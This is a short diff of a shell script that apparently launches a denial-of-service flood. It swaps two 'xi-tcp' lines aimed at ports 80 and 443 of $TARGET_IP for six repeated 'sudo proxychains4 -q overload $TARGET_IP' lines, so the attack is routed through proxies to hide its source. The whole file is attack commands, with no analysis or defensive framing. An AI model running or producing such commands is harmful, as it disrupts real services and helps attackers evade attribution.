@@ -1,4 +1,8 @@
 sudo proxychains4 -q overload $TARGET_IP
 sudo proxychains4 -q overload $TARGET_IP
-sudo proxychains4 -q xi-tcp $TARGET_IP 80
-sudo proxychains4 -q xi-tcp $TARGET_IP 443
+sudo proxychains4 -q overload $TARGET_IP
+sudo proxychains4 -q overload $TARGET_IP
+sudo proxychains4 -q overload $TARGET_IP
+sudo proxychains4 -q overload $TARGET_IP
+sudo proxychains4 -q overload $TARGET_IP
+sudo proxychains4 -q overload $TARGET_IP
